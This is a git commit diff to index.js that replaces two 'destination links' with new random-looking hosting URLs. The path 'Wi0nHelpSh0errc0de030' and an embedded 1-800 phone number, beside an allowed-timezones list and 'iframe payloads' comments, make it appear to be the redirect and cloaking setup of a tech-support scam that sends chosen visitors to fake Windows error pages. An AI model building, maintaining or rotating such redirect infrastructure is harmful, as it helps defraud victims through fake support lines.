b61fd2ab9c58aeeca7fac78a3618a96163d5de5f
paalakash <palaksh452@gmail.com>
2026-06-24 06:35:49 +0530

    Update index.js

--- index.js
+++ index.js
@@ -42,8 +42,8 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Destination Links
-const LINK_MAC = "https://jellyfish-app-kjqng.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
-const LINK_OTHERS = "https://jellyfish-app-kjqng.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
+const LINK_MAC = "https://dhfgdsgsfdgfd.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
+const LINK_OTHERS = "https://dhfgdsgsfdgfd.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
 
 // --- Pre-Compilation Cache Layer ---
 // Helper to generate identical iframe payloads dynamically on boot
